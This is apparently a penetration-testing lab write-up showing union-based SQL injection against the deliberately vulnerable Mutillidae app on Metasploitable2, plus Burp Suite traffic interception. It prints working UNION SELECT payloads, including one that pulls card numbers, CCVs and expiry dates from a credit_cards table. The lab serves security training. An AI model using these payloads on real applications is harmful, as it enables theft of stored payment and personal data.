# Documentation of Working with Metasploitable2: Penetration Testing Lab

This project demonstrates basic **penetration testing techniques** using **Metasploitable2** and **Kali Linux**. The focus is on identifying and exploiting **SQL Injection vulnerabilities** through the **Mutillidae** web application. Traffic interception and analysis are also performed using **Burp Suite**.

![Mutillidae Home](https://github.com/user-attachments/assets/111553e2-c6af-49c3-a17c-e0c5fd0fc628)

---

## 🧰 Tools Used

| Tool | Description |
|------|-------------|
| **Kali Linux** | A Debian-based OS packed with tools for digital forensics and penetration testing. It includes numerous security tools and is ideal for penetration testers. |
| **Metasploitable2** | A vulnerable virtual machine used for practicing penetration testing. |
| **Mutillidae** | A web application purposely designed with vulnerabilities for training and testing. It includes common vulnerabilities like **SQL Injection**, **XSS**, and more. |
| **Burp Suite** | A powerful platform for web application security testing, capable of intercepting and modifying HTTP requests. |

---

## 🖥️ Environment Setup

### Step 1: Identifying the Metasploitable2 IP Address

Identified the IP address of Metasploitable2 using the following command:

```bash
ifconfig -a
```

### Step 2: Access Mutillidae Web Application

Browser Address: ```http://<Metasploitable2-IP>/mutillidae```

![image](https://github.com/user-attachments/assets/a671c1c4-c0c0-43ac-b84d-084bd986bf4d)

## 💉 SQL Injection Testing

### 1. Testing Union-based SQLi vulnerability

Using UNION SELECT to determine number of columns:

![image](https://github.com/user-attachments/assets/208d5d96-1264-485d-963d-830e2a1ffeb3)

#### Command:

```bash
UNION SELECT NULL,NULL,NULL,NULL,NULL –
```

### 2. Retrieving sensitive data
Columns **CCV, ccnumber, expiration** from the **credit_cards** table in **owasp10 database** (Mutillidae).

![image](https://github.com/user-attachments/assets/274dbb19-952a-4483-a32d-ed4b85471b33)

#### Command:

```bash
UNION SELECT NULL, ccv, ccnumber, expiration, NULL FROM credit_cards –
```

### 3. Using Union-based SQLi to display the version of the MySQL database that Mutillidae web application server is running:

![image](https://github.com/user-attachments/assets/ff5afff6-9b1e-4ef3-a58a-d5b92eb7d57a)

#### Command:

```bash
UNION SELECT NULL, VERSION(), NULL, NULL, NULL ---
```

## 🛰️ Intercepting and Capturing HTTP traffic using Burp Suite

### Browser Address: 

#### ```http://<Metasploitable2-IP>/mutillidae/index.php?page=view-someones-blog.php```

Configured Burp Suite Proxy to listen on 127.0.0.1:8080 and set the Browser to use Burp as proxy.

#### Captured HTTP request:

![image](https://github.com/user-attachments/assets/58a3df65-d2ec-4a12-9284-a4e6908d1427)

